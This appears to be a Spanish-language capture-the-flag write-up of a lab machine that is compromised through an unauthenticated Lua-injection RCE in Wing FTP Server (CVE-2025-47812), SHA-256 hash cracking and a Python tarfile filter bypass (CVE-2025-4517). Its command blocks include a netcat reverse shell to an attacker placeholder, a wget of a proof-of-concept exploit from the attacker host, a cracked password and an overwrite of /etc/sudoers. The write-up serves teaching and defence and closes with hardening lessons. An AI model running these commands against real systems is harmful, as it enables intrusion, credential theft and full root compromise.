Cliente web de Wing FTP Server v7.4.3 que expone un RCE no autenticado por inyección de Lua (CVE-2025-47812), con movimiento lateral a un usuario de Linux mediante el crackeo de un hash SHA-256 extraído de la base de datos de usuarios del servidor. Escalada de privilegios mediante CVE-2025-4517, un bypass del filtro `data` del módulo `tarfile` de Python abusado a través de un script de restauración permitido por sudo.

## Reconocimiento y enumeración

El objetivo de esta fase era mapear la superficie de ataque e identificar qué servicio contenía el punto de entrada.

### Descubrimiento del host

La conectividad con el objetivo se confirmó con ICMP, y el valor del TTL dio una pista temprana del sistema operativo:

```bash
ping 10.129.244.106
PING 10.129.244.106 (10.129.244.106) 56(84) bytes of data.
64 bytes from 10.129.244.106: icmp_seq=1 ttl=63 time=43.7 ms
64 bytes from 10.129.244.106: icmp_seq=2 ttl=63 time=43.2 ms
```

Un TTL de 63 indica Linux. El TTL inicial por defecto de los kernels Linux es 64; la respuesta cruzó exactamente un salto de enrutamiento de vuelta, lo que lo decrementó a 63. Con el host confirmado vivo, pasé a un barrido completo de puertos TCP.

### Escaneo de puertos

Se ejecutó un escaneo SYN sobre los 65535 puertos TCP a alta velocidad de paquetes. `-Pn` saltó el descubrimiento de host (ICMP ya había confirmado que estaba vivo), `-n` deshabilitó el DNS inverso para mantener el escaneo rápido, y el formato de salida grepable (`-oG`) facilitó el post-procesado del resultado:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n -oG allPorts 10.129.244.106
Host: 10.129.244.106 ()  Status: Up
Host: 10.129.244.106 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: filtered (65533)
```

Solo respondieron dos puertos: SSH y HTTP. El hecho de que los 65533 puertos restantes volvieran como **filtrados** en lugar de **cerrados** sugiere con fuerza un firewall delante del host descartando silenciosamente los paquetes a todo excepto al 22 y al 80 — contexto útil, porque significa que no hay un segundo servicio web oculto ni un puerto de gestión que descubrir.

Se lanzó un escaneo dirigido con detección de servicios y los scripts por defecto contra esos dos puertos:

```bash
nmap -p22,80 -sCV -oN nmap 10.129.244.106
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
```

Dos observaciones eran relevantes. **OpenSSH 9.2p1 (Debian)** es actual y es poco probable que sea un punto de entrada directo. El servidor HTTP, sin embargo, devolvió una redirección a **`http://wingdata.htb/`** — lo que nos dice dos cosas a la vez: la aplicación usa virtual hosting basado en nombre (una petición solo por IP no cargará el vhost correcto), y hay al menos un dominio configurado en el servidor, que puede no ser el único.

El dominio se añadió al `/etc/hosts` para que resolviera localmente a la IP del objetivo, y a partir de entonces la aplicación se podía navegar por nombre:

```bash
echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts
```

### Aplicación web

Navegar a `http://wingdata.htb/` cargó el sitio corporativo de **Wing Data Solutions** — una página de marketing estática que describe una plataforma de compartición de archivos. El elemento interesante era el botón **Client Portal** de la esquina superior derecha:

![WingData corporate site](/assets/img/HTB/Wingdata/web1.png)

Pulsarlo disparó una redirección a un host distinto: **`ftp.wingdata.htb`**. Este es el segundo virtual host insinuado por el comportamiento de redirección anterior, y también hubo que añadirlo al `/etc/hosts` para que resolviera:

```bash
echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

El subdominio servía un portal de login FTP basado en web cuyo pie revelaba el nombre del producto y la versión exacta:

![Wing FTP Server v7.4.3 login portal](/assets/img/HTB/Wingdata/web2.png)

> *FTP server software powered by **Wing FTP Server v7.4.3***

Este banner de versión es todo el acceso inicial: Wing FTP Server ≤ 7.4.3 está afectado por **CVE-2025-47812**, un fallo de ejecución remota de código de pre-autenticación publicado a mediados de 2025 con una PoC pública en Exploit-DB.

## Explotación

### CVE-2025-47812 — RCE no autenticado en Wing FTP Server

La vulnerabilidad tiene su raíz en una **discrepancia de manejo de cadenas** entre dos componentes del flujo de autenticación de Wing FTP:

- La rutina de validación de credenciales (`c_CheckUser()`) procesa el `username` enviado como una cadena de C, lo que significa que **trunca en el primer byte NULL (`\x00`)**. Un username de `anonymous\x00<cualquier cosa>` valida por tanto como la cuenta legítima `anonymous`.
- La lógica de creación de sesión, sin embargo, toma el **username completo sin sanear** — el byte NULL y todos los bytes posteriores — y lo escribe verbatim en un archivo de sesión Lua en disco.

Como el archivo de sesión se evalúa después como Lua cuando se accede a un endpoint autenticado como `/dir.html`, cualquier cosa añadida tras el byte NULL se convierte en código Lua del lado del servidor que se ejecuta con los privilegios del proceso del servicio Wing FTP. El exploit es por tanto un ataque de un solo disparo y dos peticiones: un POST a `/loginok.html` para plantar el payload (Wing FTP acepta alegremente la mitad anónima del username y almacena la mitad Lua), y un GET a `/dir.html` usando la cookie UID devuelta para detonarlo.

Saqué la PoC pública de Exploit-DB (entrada 52347) y confirmé que el objetivo era vulnerable con un comando benigno que no cambia nada en la máquina pero sí prueba la ejecución de código:

```bash
python3 exploit.py -u http://ftp.wingdata.htb/ -c "which nc"
/usr/bin/nc
```

Dos hallazgos a la vez: el exploit funciona (se está ejecutando código Lua en el objetivo y la salida del comando se devuelve en la respuesta HTTP), y el sistema tiene **netcat instalado**. Ese segundo detalle importó para lo que vino después. Mis intentos iniciales de usar una reverse shell `bash -i >& /dev/tcp/...` fallaron — el contexto Lua que envuelve el comando inyectado no manejaba limpiamente la sintaxis de redirección de bash — así que pivoté a una reverse shell con netcat usando la opción `-c`. El flag `-c` solo está presente en **netcat-traditional** (se eliminó de la reescritura de OpenBSD por ser una primitiva de backdoor demasiado obvia), así que no siempre se puede asumir disponible, pero el objetivo corría el build tradicional.

Se inició un listener en la máquina atacante:

```bash
nc -lvp 4444
Listening on 0.0.0.0 4444
```

Y se lanzó el exploit de nuevo, esta vez con el payload de reverse shell como comando:

```bash
python3 exploit.py -u http://ftp.wingdata.htb/ -c "nc -c /bin/bash <ATTACKER_IP> 4444"
```

El listener capturó la conexión de vuelta casi de inmediato:

```text
Connection received on ftp.wingdata.htb 56162
```

La shell aterrizó como el usuario de servicio `wingftp`. La shell en crudo era inusable para cualquier cosa interactiva (sin job control, sin tab completion, sin Ctrl+C sin matar la conexión), así que realicé la mejora estándar de TTY: lanzar una PTY con `script`, ponerla en segundo plano, arreglar los modos del terminal desde el lado del atacante y traerla de vuelta al primer plano:

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
wingftp@wingdata:/opt/wftpserver$ ^Z
[1]+  Detenido                   nc -lvp 4444
stty raw -echo; fg
nc -lvp 4444
            reset
wingftp@wingdata:/opt/wftpserver$
```

> **Nota sobre privilegios**: aunque la descripción de la CVE afirma que el RCE corre como root en Linux, en esta máquina el servicio Wing FTP se había configurado para soltar privilegios a una cuenta dedicada `wingftp` antes de servir peticiones — un hardening sensato que convirtió un advisory de root instantáneo en un engagement de varios pasos. El directorio de trabajo inicial `/opt/wftpserver` también nos dice exactamente dónde vive la aplicación en disco, lo que se vuelve importante en la siguiente fase.

## Movimiento lateral — `wingftp` → `wacky`

Con una shell como el usuario de servicio `wingftp`, el sitio natural donde enumerar a continuación era el propio directorio de datos de la aplicación. Wing FTP almacena su configuración a nivel de servidor y la base de datos de cuentas por usuario bajo `/opt/wftpserver/Data`, y como la shell ya corre como el usuario de servicio, todos esos archivos son legibles:

```bash
ls /opt/wftpserver/Data
```

El directorio contenía la configuración global del servidor y un archivo XML por usuario para cada cuenta definida. Dos de estos archivos eran directamente relevantes.

**El archivo de ajustes del servidor** revelaba el salt global que Wing FTP usa para el hasheo de contraseñas:

```xml
<SaltingString>WingFTP</SaltingString>
```

Un único salt global es ya una debilidad de diseño — cada cuenta del servidor se hashea con la misma cadena `WingFTP` añadida, así que una sola pasada de rainbow table o diccionario crackea cada cuenta simultáneamente. Que el salt sea una cadena estática, adivinable y por defecto del fabricante agrava el problema.

**El archivo de usuario de `wacky`** contenía el hash SHA-256 de la contraseña:

```xml
<USER>
    <UserName>wacky</UserName>
    <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
    ...
</USER>
```

Una cadena hexadecimal de 64 caracteres combinada con un salt conocido es un **`sha256($pass.$salt)`** de manual — el formato de almacenamiento de contraseñas documentado de Wing FTP y el **modo 1410 de hashcat**. Nótese que este formato no tiene salt desde la perspectiva del kernel (el salt se añade a la contraseña en texto claro antes de hashear, sin iteraciones y sin key-stretching), lo que lo hace extraordinariamente barato de crackear en GPU — miles de millones de candidatos por segundo en hardware común.

Escribí el hash en un archivo en el formato estándar de hashcat `hash:salt` y lancé un ataque de diccionario con rockyou:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hashes.txt
hashcat -a 0 -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
...
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
...
Speed.#01........: 16842.4 kH/s
Recovered........: 2/6 (33.33%) Digests
```

El hash cayó en menos de un segundo. Contraseña recuperada: **`!#7Blushing^*Bride5`**. A pesar del leetspeak y la decoración con símbolos, la palabra subyacente es un candidato directo de rockyou con sustituciones simples de caracteres — exactamente la clase de contraseña contra la que un SHA-256 rápido y sin salt con un salt conocido no puede defenderse.

La credencial recuperada estaba reutilizada para la cuenta local de Linux `wacky`, así que un simple `su` realizó el pivote:

```bash
su wacky
Password: !#7Blushing^*Bride5
wacky@wingdata:/opt/wftpserver$ id
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
```

La flag de usuario era ya legible desde el directorio home de `wacky`:

```bash
cat /home/wacky/user.txt
```

## Escalada de privilegios — `wacky` → `root`

Con una shell como `wacky`, empecé la enumeración estándar de escalada de privilegios. `sudo -l` devolvió un resultado inmediatamente interesante:

```bash
sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` puede invocar un script de Python concreto como root sin contraseña, **con un argumento final arbitrario** (el comodín `*` al final de la entrada de sudoers). El comodín final es la parte que hace esto explotable — sin él, el comportamiento del script estaría fijado por los argumentos hardcodeados que pasara el administrador; con él, el atacante controla sobre qué opera el script.

El script en sí era legible por todos, así que lo inspeccioné:

```bash
cat /opt/backup_clients/restore_backup_clients.py
...
try:
    with tarfile.open(backup_path, "r") as tar:
        tar.extractall(path=staging_dir, filter="data")
    print(f"[+] Extraction completed in {staging_dir}")
except (tarfile.TarError, OSError, Exception) as e:
    print(f"[!] Error during extraction: {e}", file=sys.stderr)
    sys.exit(2)
```

El bloque crítico es la lógica de extracción. El script toma un nombre de backup en la línea de comandos, abre el archivo tar correspondiente de `/opt/backup_clients/backups/` y lo extrae en un directorio de staging usando **`filter="data"`**.

El argumento de palabra clave `filter` se añadió al módulo `tarfile` de Python específicamente para endurecerlo contra ataques basados en archivos. Se supone que el filtro `data` es el valor seguro por defecto: rechaza miembros del archivo con rutas absolutas, miembros cuyas rutas resueltas caen fuera de la raíz de extracción, y miembros con tipos peligrosos como archivos de dispositivo. Durante años antes de que este filtro existiera, `tarfile.extractall` fue una trampa bien conocida — y `filter="data"` era la solución documentada.

La versión de Python en el host resultó ser la segunda mitad de la precondición:

```bash
/usr/local/bin/python3 --version
Python 3.12.3
```

La combinación — `tarfile` con `filter="data"` en una versión de Python en el rango **3.8.0 – 3.13.1** — es exactamente la precondición para **CVE-2025-4517**, un bypass del filtro `data` que permite escribir archivos arbitrarios **fuera** del directorio de extracción abusando de un fallo en cómo el filtro maneja la interacción entre symlinks y hardlinks.

### CVE-2025-4517 — concepto

Se supone que el filtro `data` rechaza cualquier miembro del archivo cuya ruta resuelta final caiga fuera de la raíz de extracción. La técnica de bypass encadena varias primitivas dentro de un único archivo tar elaborado:

1. **Construir un árbol de directorios profundamente anidado** usando nombres de directorio extremadamente largos (247 caracteres de `d`, repetidos a lo largo de 16 niveles de anidamiento). Esto crea una estructura de rutas que el filtro tiene que evaluar pero que no dispara sus comprobaciones de seguridad.
2. **En cada nivel, añadir un symlink de nombre corto** apuntando al nombre de directorio largo del mismo nivel. Esto monta un bucle de symlinks que el filtro recorre pero no clasifica como escape.
3. **Añadir una cadena de symlinks larga** cuyo `linkname` es una pila de segmentos `../` — los suficientes como para subir hasta la raíz del sistema de archivos independientemente del directorio de extracción, terminando apuntando a `/etc`.
4. **Añadir una entrada de hardlink** cuyo nombre de destino se resuelve *a través de* la cadena de symlinks hasta `escape/sudoers`. En el momento de la extracción, el kernel resuelve la cadena de symlinks en el momento de creación del hardlink y el nuevo hardlink acaba apuntando al **inodo de `/etc/sudoers`** — completamente fuera del directorio de staging.
5. **Añadir una entrada de archivo regular** con el mismo nombre de archivo que el hardlink. Cuando `tarfile` abre el destino para escribir el contenido del archivo, el open sigue el hardlink y la escritura va **directamente a `/etc/sudoers`**.

El efecto neto es una escritura arbitraria de archivos como el usuario que ejecuta la extracción. Como la entrada de sudoers ejecuta a ese usuario como root, la escritura aterriza como root, y `/etc/sudoers` es el objetivo natural porque añadirle `wacky ALL=(ALL) NOPASSWD: ALL` produce un camino limpio e incondicional a una shell de root.

### Explotación

Cloné la PoC pública (`AzureADTrent/CVE-2025-4517-POC`) en mi máquina atacante y la serví por un servidor HTTP de Python improvisado para que el objetivo pudiera obtenerla:

```bash
# En el atacante:
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# En el objetivo como wacky:
wget http://<ATTACKER_IP>:8000/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
```

La PoC construye el tar malicioso siguiendo el patrón de cinco pasos descrito arriba, con una entrada de `sudoers` de `wacky ALL=(ALL) NOPASSWD: ALL` como payload. Deja el archivo en `/opt/backup_clients/backups/backup_9999.tar` (donde el script vulnerable espera encontrar los backups), y luego invoca el comando de restauración permitido por sudo con ese nombre de archivo para disparar la extracción como root:

```text
[*] Target user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[+] Exploit deployed successfully
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
```

Con `wacky` teniendo ya `NOPASSWD: ALL` en `/etc/sudoers`, el paso final fue una única invocación de sudo:

```bash
sudo /bin/bash
root@wingdata:/tmp# whoami
root
```

La flag de root era legible desde `/root`:

```bash
cat /root/root.txt
```

## Conclusiones clave

- **El disclosure de versión a nivel de banner sigue siendo decisivo.** "Wing FTP Server v7.4.3" en el pie del portal de login es todo el acceso inicial — no se necesita profundidad de enumeración cuando la etiqueta de versión apunta directamente a una CVE publicada.
- **El drop de privilegios importa.** Un advisory del fabricante que describe un RCE como "root en Linux" puede ser engañoso en la práctica. Que el servicio en ejecución suelte a una cuenta dedicada de bajos privilegios antes de servir peticiones cambia toda la ruta de post-explotación. El hardening funcionó como estaba diseñado aquí, aunque la CVE subyacente no.
- **El almacenamiento de contraseñas de aplicación no siempre se reutiliza de forma segura.** Un SHA-256 con un único salt global, en texto claro y por defecto del fabricante es rápido de crackear en GPUs comunes una vez que ambas piezas son recuperables del mismo directorio legible. `WingFTP` como salt ofrecía un factor de trabajo efectivamente nulo frente a un ataque de diccionario — medido en milisegundos por hash en una GPU de gama media.
- **`filter="data"` no es una bala de plata.** Endurecer el `tarfile.extractall` de Python con la nueva API de filtros es el valor por defecto correcto, pero CVE-2025-4517 demuestra que la defensa en profundidad sigue importando: nunca extraigas archivos controlados por el usuario como root, ni siquiera con el filtro seguro habilitado. El comodín de sudoers al final de la regla fue la decisión de diseño que convirtió un pequeño bug de parser en un compromiso total del sistema.
